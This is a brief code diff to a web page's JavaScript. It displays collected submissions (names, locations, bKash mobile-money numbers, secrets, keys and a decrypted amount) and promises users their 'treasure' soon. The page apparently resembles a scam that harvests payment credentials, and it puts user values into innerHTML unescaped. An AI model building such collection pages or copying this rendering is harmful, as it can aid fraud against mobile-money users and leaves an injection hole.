@@ -112,6 +112,7 @@ if (document.getElementById('submissions')) {
             <div><strong>${s.fullName}</strong> — ${s.location}</div>
             <div><small>${time}</small></div>
             <div><small>Phone:</small> ${s.bkashNumber || ''}</div>
+            <div><small>Amount:</small> ${s.decrypted || ''}</div>
             <div style="margin-top:6px;word-break:break-all;"><small>Secret:</small> ${s.secret || ''}</div>
             <div style="word-break:break-all;"><small>Key:</small> ${s.key || ''}</div>
           </div>`;
@@ -243,7 +244,7 @@ if (document.getElementById('verifyBtn')) {
       formMsg.textContent = '';
       const resultMsgEl = document.getElementById('resultMsg');
       if (resultMsgEl) {
-        resultMsgEl.innerHTML = '<strong>Thank You! you will receive soon!</strong>';
+        resultMsgEl.innerHTML = '<strong>Thanks! you will receive your treasure soon!</strong>';
       }
     });
   }
@@ -265,3 +266,4 @@ if (document.getElementById('verifyBtn')) {
     });
   }
 }
+
